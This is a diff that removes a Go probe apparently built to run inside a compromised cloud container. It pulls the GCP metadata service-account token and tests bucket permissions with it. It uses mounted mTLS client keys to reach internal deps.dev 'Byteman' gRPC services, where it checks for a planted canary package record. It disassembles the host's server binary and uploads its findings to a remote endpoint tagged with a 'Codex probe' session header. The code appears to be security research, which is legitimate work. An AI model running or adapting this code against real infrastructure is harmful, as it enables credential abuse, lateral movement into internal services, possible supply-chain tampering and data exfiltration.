-			field.value = data[offset : offset+int(length)]
-			offset += int(length)
-			if len(field.value) > 0 && depth < maximumWireDepth {
-				if child, valid := decodeWireMessage(field.value, depth+1); valid && len(child.fields) > 0 {
-					field.child = child
-				}
-			}
-		case 5:
-			if len(data)-offset < 4 {
-				return nil, false
-			}
-			offset += 4
-		default:
-			return nil, false
-		}
-		message.fields = append(message.fields, field)
-	}
-	return message, true
-}
-
-func decodeGRPCMessages(body []byte) ([]*decodedWireMessage, error) {
-	var messages []*decodedWireMessage
-	for offset := 0; offset < len(body); {
-		if len(body)-offset < 5 {
-			return nil, errors.New("truncated gRPC frame header")
-		}
-		if body[offset] != 0 {
-			return nil, errors.New("compressed gRPC response was not allowed")
-		}
-		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
-		offset += 5
-		if length < 0 || length > len(body)-offset {
-			return nil, errors.New("truncated gRPC frame payload")
-		}
-		message, valid := decodeWireMessage(body[offset:offset+length], 0)
-		if !valid {
-			return nil, errors.New("gRPC payload was not valid bounded protobuf wire data")
-		}
-		messages = append(messages, message)
-		offset += length
-	}
-	return messages, nil
-}
-
-func knownWireText(value []byte) string {
-	if !utf8.Valid(value) {
-		return ""
-	}
-	switch string(value) {
-	case bytemanCanaryURL:
-		return "[canary-url]"
-	case targetRegistry, targetModuleName, targetVersion, downloadSource:
-		return string(value)
-	default:
-		return ""
-	}
-}
-
-func summarizeWireMessages(messages []*decodedWireMessage) ([]wireFieldDigest, error) {
-	var digests []wireFieldDigest
-	for frame, message := range messages {
-		prefix := "frame[" + strconv.Itoa(frame) + "]"
-		if err := walkWireMessage(message, prefix, &digests); err != nil {
-			return nil, err
-		}
-	}
-	return digests, nil
-}
-
-func summarizeWirePayload(payload []byte) ([]wireFieldDigest, error) {
-	message, valid := decodeWireMessage(payload, 0)
-	if !valid {
-		return nil, errors.New("request payload was not valid bounded protobuf wire data")
-	}
-	var digests []wireFieldDigest
-	if err := walkWireMessage(message, "request", &digests); err != nil {
-		return nil, err
-	}
-	return digests, nil
-}
-
-func walkWireMessage(message *decodedWireMessage, prefix string, digests *[]wireFieldDigest) error {
-	occurrences := map[int]int{}
-	for _, field := range message.fields {
-		index := occurrences[field.number]
-		occurrences[field.number]++
-		if len(*digests) >= maximumWireFields {
-			return errors.New("protobuf wire field limit exceeded")
-		}
-		component := strconv.Itoa(field.number)
-		path := prefix + "." + component + "[" + strconv.Itoa(index) + "]"
-		item := wireFieldDigest{Path: path, WireType: field.wire}
-		if field.wire == 0 {
-			value := field.varint
-			item.Varint = &value
-		}
-		if field.wire == 2 {
-			digest := sha256.Sum256(field.value)
-			item.Bytes = len(field.value)
-			item.SHA256 = hex.EncodeToString(digest[:])
-			item.Text = knownWireText(field.value)
-			item.Nested = field.child != nil
-		}
-		*digests = append(*digests, item)
-		if field.child != nil {
-			if err := walkWireMessage(field.child, path, digests); err != nil {
-				return err
-			}
-		}
-	}
-	return nil
-}
-
-type lookupBodyAnalysis struct {
-	Wire          []wireFieldDigest
-	RecordCount   int
-	MatchCount    int
-	RecordsSHA256 string
-	MatchSHA256   string
-	MatchPath     string
-	RecordSHA256  string
-	DigestSHA256  string
-	IDSHA256      string
-}
-
-type downloadRecordIdentity struct {
-	Matched      bool
-	RecordSHA256 string
-	DigestSHA256 string
-	IDSHA256     string
-}
-
-type downloadBodyAnalysis struct {
-	Wire       []wireFieldDigest
-	Identity   downloadRecordIdentity
-	StatusSet  bool
-	StatusCode uint64
-}
-
-func targetMetadataMatches(message *decodedWireMessage) bool {
-	counts := map[int]int{}
-	matched := map[int]bool{}
-	for _, field := range message.fields {
-		switch field.number {
-		case 2:
-			counts[2]++
-			matched[2] = field.wire == 2 && string(field.value) == targetRegistry
-		case 3:
-			counts[3]++
-			matched[3] = field.wire == 0 && field.varint == 1 // GO_MODULE
-		case 4:
-			counts[4]++
-			matched[4] = field.wire == 2 && string(field.value) == targetModuleName
-		case 5:
-			counts[5]++
-			matched[5] = field.wire == 0 && field.varint == 1 // CONCRETE
-		case 6:
-			counts[6]++
-			matched[6] = field.wire == 2 && string(field.value) == targetVersion
-		}
-	}
-	for _, number := range []int{2, 3, 4, 5, 6} {
-		if counts[number] != 1 || !matched[number] {
-			return false
-		}
-	}
-	return true
-}
-
-func analyzeTargetDownload(value []byte) downloadRecordIdentity {
-	identity := downloadRecordIdentity{}
-	message, valid := decodeWireMessage(value, 0)
-	if !valid {
-		return identity
-	}
-	counts := map[int]int{}
-	matched := map[int]bool{}
-	var digestValue, idValue []byte
-	for _, field := range message.fields {
-		switch field.number {
-		case 1:
-			counts[1]++
-			matched[1] = field.wire == 2 && string(field.value) == bytemanCanaryURL
-		case 2:
-			counts[2]++
-			matched[2] = field.wire == 2 && len(field.value) > 0
-			digestValue = field.value
-		case 3:
-			counts[3]++
-			matched[3] = field.wire == 0 && field.varint == targetCanaryBytes
-		case 12:
-			counts[12]++
-			if field.wire == 2 {
-				metadata, valid := decodeWireMessage(field.value, 0)
-				matched[12] = valid && targetMetadataMatches(metadata)
-			}
-		case 17:
-			counts[17]++
-			matched[17] = field.wire == 2 && len(field.value) > 0
-			idValue = field.value
-		}
-	}
-	for _, number := range []int{1, 2, 3, 12, 17} {
-		if counts[number] != 1 || !matched[number] {
-			return identity
-		}
-	}
-	recordDigest := sha256.Sum256(value)
-	digestDigest := sha256.Sum256(digestValue)
-	idDigest := sha256.Sum256(idValue)
-	identity.Matched = true
-	identity.RecordSHA256 = hex.EncodeToString(recordDigest[:])
-	identity.DigestSHA256 = hex.EncodeToString(digestDigest[:])
-	identity.IDSHA256 = hex.EncodeToString(idDigest[:])
-	return identity
-}
-
-func analyzeDownloadBody(body []byte) (downloadBodyAnalysis, error) {
-	analysis := downloadBodyAnalysis{}
-	messages, err := decodeGRPCMessages(body)
-	if err != nil {
-		return analysis, err
-	}
-	if len(messages) != 1 {
-		return analysis, errors.New("Download response did not contain exactly one unary gRPC frame")
-	}
-	analysis.Wire, err = summarizeWireMessages(messages)
-	if err != nil {
-		return analysis, err
-	}
-	recordCount := 0
-	statusCount := 0
-	for _, field := range messages[0].fields {
-		switch field.number {
-		case 1:
-			recordCount++
-			if field.wire != 2 {
-				return analysis, errors.New("DownloadResponse record field had the wrong wire type")
-			}
-			analysis.Identity = analyzeTargetDownload(field.value)
-		case 3:
-			statusCount++
-			if field.wire != 0 {
-				return analysis, errors.New("DownloadResponse status_code had the wrong wire type")
-			}
-			analysis.StatusSet = true
-			analysis.StatusCode = field.varint
-		default:
-			return analysis, errors.New("DownloadResponse contained a field outside record 1 and status_code 3")
-		}
-	}
-	if recordCount != 1 || statusCount > 1 || !analysis.Identity.Matched {
-		return analysis, errors.New("DownloadResponse omitted one exact identified B record")
-	}
-	return analysis, nil
-}
-
-func writeFingerprintRecord(hasher io.Writer, value []byte) {
-	var length [4]byte
-	binary.BigEndian.PutUint32(length[:], uint32(len(value)))
-	_, _ = hasher.Write(length[:])
-	_, _ = hasher.Write(value)
-}
-
-func analyzeLookupBody(body []byte) (lookupBodyAnalysis, error) {
-	analysis := lookupBodyAnalysis{}
-	messages, err := decodeGRPCMessages(body)
-	if err != nil {
-		return analysis, err
-	}
-	if len(messages) == 0 {
-		return analysis, errors.New("streaming Lookup response contained no gRPC frames")
-	}
-	analysis.Wire, err = summarizeWireMessages(messages)
-	if err != nil {
-		return analysis, err
-	}
-	recordsHasher := sha256.New()
-	matchesHasher := sha256.New()
-	for frameIndex, message := range messages {
-		fieldIndex := 0
-		for _, field := range message.fields {
-			if field.number != 1 {
-				return analysis, errors.New("LookupResponse contained a field outside repeated Download field 1")
-			}
-			if field.wire != 2 {
-				return analysis, errors.New("LookupResponse Download field had the wrong wire type")
-			}
-			analysis.RecordCount++
-			writeFingerprintRecord(recordsHasher, field.value)
-			identity := analyzeTargetDownload(field.value)
-			if identity.Matched {
-				analysis.MatchCount++
-				writeFingerprintRecord(matchesHasher, field.value)
-				analysis.MatchPath = "frame[" + strconv.Itoa(frameIndex) + "].1[" + strconv.Itoa(fieldIndex) + "]"
-				analysis.RecordSHA256 = identity.RecordSHA256
-				analysis.DigestSHA256 = identity.DigestSHA256
-				analysis.IDSHA256 = identity.IDSHA256
-			}
-			fieldIndex++
-		}
-	}
-	if analysis.RecordCount > 0 {
-		analysis.RecordsSHA256 = hex.EncodeToString(recordsHasher.Sum(nil))
-	}
-	if analysis.MatchCount > 0 {
-		analysis.MatchSHA256 = hex.EncodeToString(matchesHasher.Sum(nil))
-	}
-	if analysis.MatchCount != 1 {
-		analysis.MatchPath = ""
-		analysis.RecordSHA256 = ""
-		analysis.DigestSHA256 = ""
-		analysis.IDSHA256 = ""
-	}
-	return analysis, nil
-}
-
-func exactPayload(value []byte, expectedBytes int, expectedSHA256 string) bool {
-	if len(value) != expectedBytes {
-		return false
-	}
-	digest := sha256.Sum256(value)
-	return hex.EncodeToString(digest[:]) == expectedSHA256
-}
-
-func analyzeStreamBody(body []byte) ([]wireFieldDigest, []byte, string, error) {
-	return analyzeStreamBodyExpected(body, targetCanaryBytes, targetCanarySHA256)
-}
-
-func analyzeStreamBodyExpected(body []byte, expectedBytes int, expectedSHA256 string) ([]wireFieldDigest, []byte, string, error) {
-	messages, err := decodeGRPCMessages(body)
-	if err != nil {
-		return nil, nil, "", err
-	}
-	if len(messages) == 0 {
-		return nil, nil, "", errors.New("Stream response contained no gRPC frames")
-	}
-	digests, err := summarizeWireMessages(messages)
-	if err != nil {
-		return nil, nil, "", err
-	}
-	payload := []byte{}
-	for _, message := range messages {
-		for _, field := range message.fields {
-			if field.number != 2 {
-				continue
-			}
-			if field.wire != 2 {
-				return digests, nil, "", errors.New("StreamResponse data field 2 had the wrong wire type")
-			}
-			payload = append(payload, field.value...)
-			if len(payload) > expectedBytes {
-				return digests, nil, "", errors.New("StreamResponse data exceeded the exact canary size")
-			}
-		}
-	}
-	if !exactPayload(payload, expectedBytes, expectedSHA256) {
-		return digests, nil, "", errors.New("top-level StreamResponse field 2 did not match the exact canary")
-	}
-	return digests, payload, "top-level-field-2", nil
-}
-
-type boundedBuffer struct {
-	data      []byte
-	maximum   int
-	truncated bool
-}
-
-func (buffer *boundedBuffer) Write(value []byte) (int, error) {
-	written := len(value)
-	remaining := buffer.maximum - len(buffer.data)
-	if remaining > 0 {
-		if remaining > len(value) {
-			remaining = len(value)
-		}
-		buffer.data = append(buffer.data, value[:remaining]...)
-	}
-	if remaining < len(value) {
-		buffer.truncated = true
-	}
-	return written, nil
-}
-
-func runFixedTool(path string, arguments ...string) ([]byte, error) {
-	ctx, cancel := context.WithTimeout(context.Background(), 12*time.Second)
-	defer cancel()
-	stdout := &boundedBuffer{maximum: 16 * 1024 * 1024}
-	stderr := &boundedBuffer{maximum: 16 * 1024}
-	command := exec.CommandContext(ctx, path, arguments...)
-	command.Stdout = stdout
-	command.Stderr = stderr
-	err := command.Run()
-	if ctx.Err() != nil {
-		return nil, errors.New("fixed inspection tool timed out")
-	}
-	if err != nil {
-		return nil, errors.New("fixed inspection tool failed")
-	}
-	if stdout.truncated {
-		return nil, errors.New("fixed inspection output exceeded its limit")
-	}
-	return stdout.data, nil
-}
-
-func scanBoundedLines(data []byte, include func(string) bool, maximum int) []string {
-	var result []string
-	scanner := bufio.NewScanner(bytes.NewReader(data))
-	scanner.Buffer(make([]byte, 4096), 64*1024)
-	for scanner.Scan() && len(result) < maximum {
-		line := strings.TrimSpace(scanner.Text())
-		if len(line) > 512 {
-			line = line[:512] + "[truncated]"
-		}
-		if line != "" && include(line) {
-			result = append(result, line)
-		}
-	}
-	return result
-}
-
-func instructionWindow(data []byte, marker string, before, after int) []string {
-	lines := scanBoundedLines(data, func(string) bool { return true }, 4096)
-	for index, line := range lines {
-		if !strings.Contains(line, marker) {
-			continue
-		}
-		start := index - before
-		if start < 0 {
-			start = 0
-		}
-		end := index + after + 1
-		if end > len(lines) {
-			end = len(lines)
-		}
-		return append([]string(nil), lines[start:end]...)
-	}
-	return nil
-}
-
-func runSessionDataflowInspection(report *probeReport) {
-	result := &inspectionResult{}
-	report.Inspection = result
-	nmOutput, err := runFixedTool("/usr/bin/nm", "-n", "/proc/1/exe")
-	if err != nil {
-		result.Error = cleanError(err)
-		return
-	}
-	result.Symbols = scanBoundedLines(nmOutput, func(line string) bool {
-		return strings.Contains(line, "sos.googlesource.com/sos/server.dial") ||
-			(strings.Contains(line, "sos.googlesource.com/sos/server.") && strings.Contains(line, "Session"))
-	}, 64)
-	dialOutput, err := runFixedTool(
-		"/usr/bin/objdump", "-d", "-M", "intel",
-		"--disassemble=sos.googlesource.com/sos/server.dial", "/proc/1/exe",
-	)
-	if err != nil {
-		result.Error = cleanError(err)
-		return
-	}
-	result.DialWindow = instructionWindow(dialOutput, "metadata.New", 28, 16)
-	callerOutput, err := runFixedTool(
-		"/usr/bin/objdump", "-d", "-M", "intel", "--disassemble=main.main", "/proc/1/exe",
-	)
-	if err != nil {
-		result.Error = cleanError(err)
-		return
-	}
-	result.CallerWindow = instructionWindow(callerOutput, "server.dial", 24, 12)
-	if len(result.Symbols) == 0 || len(result.DialWindow) == 0 || len(result.CallerWindow) == 0 {
-		result.Error = "fixed inspection markers were incomplete"
-		return
-	}
-	report.Reason = "bounded static session dataflow inspection completed"
-}
-
-func inspectMetadata(client *http.Client) (metadataResult, string) {
-	result := metadataResult{}
-	email, err := metadataText(client, "instance/service-accounts/default/email")
-	if err != nil {
-		result.Error = cleanError(err)
-		return result, ""
-	}
-	result.Email = strings.TrimSpace(email)
-	scopes, err := metadataText(client, "instance/service-accounts/default/scopes")
-	if err == nil {
-		for _, scope := range strings.Fields(scopes) {
-			result.Scopes = append(result.Scopes, scope)
-		}
-	}
-	tokenBody, err := metadataText(client, "instance/service-accounts/default/token")
-	if err != nil {
-		result.Error = cleanError(err)
-		return result, ""
-	}
-	var token tokenResponse
-	if json.Unmarshal([]byte(tokenBody), &token) != nil || token.AccessToken == "" || token.ExpiresIn <= 0 {
-		result.Error = "metadata token response was invalid"
-		return result, ""
-	}
-	result.TokenValid = true
-	return result, token.AccessToken
-}
-
-func metadataText(client *http.Client, path string) (string, error) {
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
-	defer cancel()
-	endpoint := "http://metadata.google.internal/computeMetadata/v1/" + path
-	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
-	if err != nil {
-		return "", err
-	}
-	request.Header.Set("Metadata-Flavor", "Google")
-	response, err := client.Do(request)
-	if err != nil {
-		return "", err
-	}
-	defer response.Body.Close()
-	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
-	if err != nil || len(body) > 64*1024 {
-		return "", errors.New("metadata response too large")
-	}
-	if response.StatusCode != http.StatusOK {
-		return "", fmt.Errorf("metadata HTTP %d", response.StatusCode)
-	}
-	return string(body), nil
-}
-
-func testBucketPermissions(token, bucket string) bucketResult {
-	result := bucketResult{Bucket: bucket}
-	values := url.Values{}
-	for _, permission := range bucketPermissions {
-		values.Add("permissions", permission)
-	}
-	endpoint := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode()
-	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
-	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	request.Header.Set("Authorization", "Bearer "+token)
-	request.Header.Set("User-Agent", probeUserAgent)
-	response, err := http.DefaultClient.Do(request)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result
-	}
-	defer response.Body.Close()
-	result.HTTPStatus = response.StatusCode
-	body, err := io.ReadAll(io.LimitReader(response.Body, 64*1024+1))
-	if err != nil || len(body) > 64*1024 {
-		result.Error = "permission response too large"
-		return result
-	}
-	var decoded struct {
-		Permissions []string `json:"permissions"`
-		Error       *struct {
-			Code   int    `json:"code"`
-			Status string `json:"status"`
-		} `json:"error"`
-	}
-	if json.Unmarshal(body, &decoded) != nil {
-		result.Error = "permission response was not JSON"
-		return result
-	}
-	result.Granted = decoded.Permissions
-	sort.Strings(result.Granted)
-	if decoded.Error != nil {
-		result.APIStatus = decoded.Error.Status
-		if result.APIStatus == "" {
-			result.APIStatus = strconv.Itoa(decoded.Error.Code)
-		}
-	}
-	return result
-}
-
-func verifyLegacyLocalhost(state tls.ConnectionState, roots *x509.CertPool) error {
-	if len(state.PeerCertificates) == 0 {
-		return errors.New("Byteman TLS peer sent no certificate")
-	}
-	leaf := state.PeerCertificates[0]
-	if leaf.Subject.CommonName != "localhost" {
-		return errors.New("Byteman TLS legacy common name was not localhost")
-	}
-	intermediates := x509.NewCertPool()
-	for _, certificate := range state.PeerCertificates[1:] {
-		intermediates.AddCert(certificate)
-	}
-	_, err := leaf.Verify(x509.VerifyOptions{
-		Roots:         roots,
-		Intermediates: intermediates,
-		KeyUsages:     []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
-	})
-	if err != nil {
-		return fmt.Errorf("Byteman TLS chain verification failed: %w", err)
-	}
-	return nil
-}
-
-func mountedPrivateRootPool(rootPEM []byte) (*x509.CertPool, error) {
-	roots := x509.NewCertPool()
-	if !roots.AppendCertsFromPEM(rootPEM) {
-		return nil, errors.New("server pool contained no certificates")
-	}
-	return roots, nil
-}
-
-func newMTLSClient(routeMode string) (*http.Client, string, error) {
-	serviceHost, port, tlsServerName, useInjectedRPC, err := bytemanRoute(routeMode)
-	if err != nil {
-		return nil, "", err
-	}
-	certificate, err := tls.LoadX509KeyPair("/etc/tls/client/tls.crt", "/etc/tls/client/tls.key")
-	if err != nil {
-		return nil, "", err
-	}
-	rootPEM, err := os.ReadFile("/etc/tls/server-pool/server-tls-pool.pem")
-	if err != nil {
-		return nil, "", err
-	}
-	// Trust only the explicitly mounted private service pool. System/public
-	// roots must never be usable for a direct internal Byteman connection.
-	roots, err := mountedPrivateRootPool(rootPEM)
-	if err != nil {
-		return nil, "", err
-	}
-	var selected net.IP
-	if useInjectedRPC {
-		serviceHost = strings.TrimSpace(os.Getenv("RPC_SERVICE_HOST"))
-		portText := strings.TrimSpace(os.Getenv("RPC_SERVICE_PORT_GRPC"))
-		selected = net.ParseIP(serviceHost)
-		parsedPort, parseErr := strconv.Atoi(portText)
-		if selected == nil || !selected.IsPrivate() || selected.IsUnspecified() || selected.IsMulticast() {
-			return nil, "", errors.New("injected RPC service was not a private IP")
-		}
-		if parseErr != nil || parsedPort < 1 || parsedPort > 65535 {
-			return nil, "", errors.New("injected RPC service port was invalid")
-		}
-		port = parsedPort
-	} else {
-		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
-		defer cancel()
-		addresses, resolveErr := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
-		if resolveErr != nil {
-			return nil, "", errors.New("direct Byteman service did not resolve")
-		}
-		for _, candidate := range addresses {
-			if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
-				selected = candidate.IP
-				break
-			}
-		}
-		if selected == nil {
-			return nil, "", errors.New("direct Byteman service had no private address")
-		}
-	}
-	address := net.JoinHostPort(selected.String(), strconv.Itoa(port))
-	authorityHost := bytemanAuthorityHost(serviceHost, tlsServerName, useInjectedRPC)
-	endpoint := "https://" + net.JoinHostPort(authorityHost, strconv.Itoa(port))
-	rpcServiceHost = serviceHost
-	rpcDialAddress = address
-	dialer := &net.Dialer{Timeout: requestTimeout, KeepAlive: 30 * time.Second}
-	legacyLocalhost := routeMode == "byteman-localhost"
-	tlsConfig := &tls.Config{
-		Certificates:       []tls.Certificate{certificate},
-		RootCAs:            roots,
-		MinVersion:         tls.VersionTLS12,
-		ServerName:         tlsServerName,
-		InsecureSkipVerify: legacyLocalhost, // Verified below for the legacy CN-only service certificate.
-	}
-	if legacyLocalhost {
-		tlsConfig.VerifyConnection = func(state tls.ConnectionState) error {
-			return verifyLegacyLocalhost(state, roots)
-		}
-	}
-	transport := &http.Transport{
-		Proxy: nil,
-		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
-			return dialer.DialContext(ctx, network, address)
-		},
-		TLSClientConfig:   tlsConfig,
-		ForceAttemptHTTP2: true,
-	}
-	return &http.Client{Transport: transport, Timeout: bytemanHTTPTimeout}, endpoint, nil
-}
-
-func bytemanAuthorityHost(serviceHost, tlsServerName string, useInjectedRPC bool) string {
-	if useInjectedRPC {
-		return tlsServerName
-	}
-	return serviceHost
-}
-
-func bytemanRoute(routeMode string) (string, int, string, bool, error) {
-	switch routeMode {
-	case "byteman-core-localhost":
-		return "byteman-core.default.svc.cluster.local", 9000, "localhost", false, nil
-	case "byteman-localhost":
-		return "byteman.default.svc.cluster.local", 9000, "localhost", false, nil
-	case "rpc-gateway":
-		return "", 0, "rpc.deps.dev", true, nil
-	case "byteman-oregon-gateway":
-		return "", 0, "byteman.oregon.int.deps.dev", true, nil
-	case "byteman-home-oregon-gateway":
-		return "", 0, "byteman.home-oregon.int.deps.dev", true, nil
-	case "byteman-iowa-gateway":
-		return "", 0, "byteman.iowa.int.deps.dev", true, nil
-	default:
-		return "", 0, "", false, errors.New("route mode was not allowed")
-	}
-}
-
-func callGRPC(client *http.Client, endpoint, method string, payload []byte) grpcResult {
-	result, _ := callGRPCRaw(client, endpoint, method, payload)
-	return result
-}
-
-func callGRPCRaw(client *http.Client, endpoint, method string, payload []byte) (grpcResult, []byte) {
-	return callGRPCRawLimits(client, endpoint, method, payload, bytemanGRPCTimeout, bytemanHTTPTimeout)
-}
-
-func callGRPCRawTimeout(client *http.Client, endpoint, method string, payload []byte, timeout time.Duration) (grpcResult, []byte) {
-	return callGRPCRawLimits(client, endpoint, method, payload, timeout, timeout)
-}
-
-func attachRequestTranscript(result *grpcResult, payload []byte) []byte {
-	result.RequestPayloadBytes = len(payload)
-	payloadDigest := sha256.Sum256(payload)
-	result.RequestPayloadSHA256 = hex.EncodeToString(payloadDigest[:])
-	requestWire, requestWireErr := summarizeWirePayload(payload)
-	result.RequestWire = requestWire
-	if requestWireErr != nil {
-		result.RequestWireError = cleanError(requestWireErr)
-	}
-	frame := make([]byte, 5, 5+len(payload))
-	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
-	frame = append(frame, payload...)
-	result.RequestFrameBytes = len(frame)
-	frameDigest := sha256.Sum256(frame)
-	result.RequestFrameSHA256 = hex.EncodeToString(frameDigest[:])
-	return frame
-}
-
-func callGRPCRawLimits(client *http.Client, endpoint, method string, payload []byte, grpcTimeout, httpTimeout time.Duration) (grpcResult, []byte) {
-	result := grpcResult{Method: method}
-	frame := attachRequestTranscript(&result, payload)
-	if grpcTimeout <= 0 || grpcTimeout > bytemanGRPCTimeout || httpTimeout < grpcTimeout || httpTimeout > bytemanHTTPTimeout {
-		result.Error = "gRPC timeout was outside the bounded range"
-		return result, nil
-	}
-	ctx, cancel := context.WithTimeout(context.Background(), httpTimeout)
-	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
-	if err != nil {
-		result.Error = cleanError(err)
-		return result, nil
-	}
-	request.Header.Set("Content-Type", "application/grpc")
-	request.Header.Set("TE", "trailers")
-	request.Header.Set("User-Agent", probeUserAgent)
-	if grpcTimeout == bytemanGRPCTimeout {
-		request.Header.Set("Grpc-Timeout", "60S")
-	} else {
-		timeoutMS := grpcTimeout.Milliseconds()
-		if timeoutMS < 1 {
-			timeoutMS = 1
-		}
-		request.Header.Set("Grpc-Timeout", strconv.FormatInt(timeoutMS, 10)+"m")
-	}
-	response, err := client.Do(request)
-	if err != nil {
-		result.Error = cleanError(err)
-		return result, nil
-	}
-	defer response.Body.Close()
-	result.HTTPStatus = response.StatusCode
-	result.ContentType = response.Header.Get("Content-Type")
-	body, err := io.ReadAll(io.LimitReader(response.Body, maximumBody+1))
-	if err != nil {
-		result.Error = cleanError(err)
-		return result, nil
-	}
-	if len(body) > maximumBody {
-		result.Error = "gRPC response too large"
-		return result, nil
-	}
-	result.BodyBytes = len(body)
-	digest := sha256.Sum256(body)
-	result.BodySHA256 = hex.EncodeToString(digest[:])
-	result.GRPCStatus = response.Trailer.Get("Grpc-Status")
-	if result.GRPCStatus == "" {
-		result.GRPCStatus = response.Header.Get("Grpc-Status")
-	}
-	result.GRPCMessage = response.Trailer.Get("Grpc-Message")
-	if result.GRPCMessage == "" {
-		result.GRPCMessage = response.Header.Get("Grpc-Message")
-	}
-	if decoded, decodeErr := url.QueryUnescape(result.GRPCMessage); decodeErr == nil {
-		result.GRPCMessage = decoded
-	}
-	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, sessionNonce, "[session]")
-	result.GRPCMessage = strings.ReplaceAll(result.GRPCMessage, bytemanCanaryURL, "[canary-url]")
-	if len(result.GRPCMessage) > 1024 {
-		result.GRPCMessage = result.GRPCMessage[:1024] + "[truncated]"
-	}
-	result.Authenticated = result.GRPCStatus == "0"
-	return result, body
-}
-
-func appendUvarint(destination []byte, value uint64) []byte {
-	var buffer [binary.MaxVarintLen64]byte
-	size := binary.PutUvarint(buffer[:], value)
-	return append(destination, buffer[:size]...)
-}
-
-func appendVarintField(destination []byte, number int, value uint64) []byte {
-	destination = appendUvarint(destination, uint64(number<<3))
-	return appendUvarint(destination, value)
-}
-
-func appendBytesField(destination []byte, number int, value []byte) []byte {
-	destination = appendUvarint(destination, uint64(number<<3|2))
-	destination = appendUvarint(destination, uint64(len(value)))
-	return append(destination, value...)
-}
-
-func appendStringField(destination []byte, number int, value string) []byte {
-	return appendBytesField(destination, number, []byte(value))
-}
-
-func submitResult(endpoint string, result commandResult) error {
-	encoded, err := json.Marshal(result)
-	if err != nil || len(encoded) > maximumResult {
-		return errors.New("result too large")
-	}
-	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
-	defer cancel()
-	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
-	if err != nil {
-		return err
-	}
-	request.Header.Set("User-Agent", probeUserAgent)
-	request.Header.Set("Content-Type", "application/json")
-	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
-	client := &http.Client{
-		CheckRedirect: func(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse },
-		Timeout:       resultTimeout,
-	}
-	response, err := client.Do(request)
-	if err != nil {
-		return err
-	}
-	defer response.Body.Close()
-	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
-	if response.StatusCode < 200 || response.StatusCode >= 300 {
-		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
-	}
-	return nil
 }
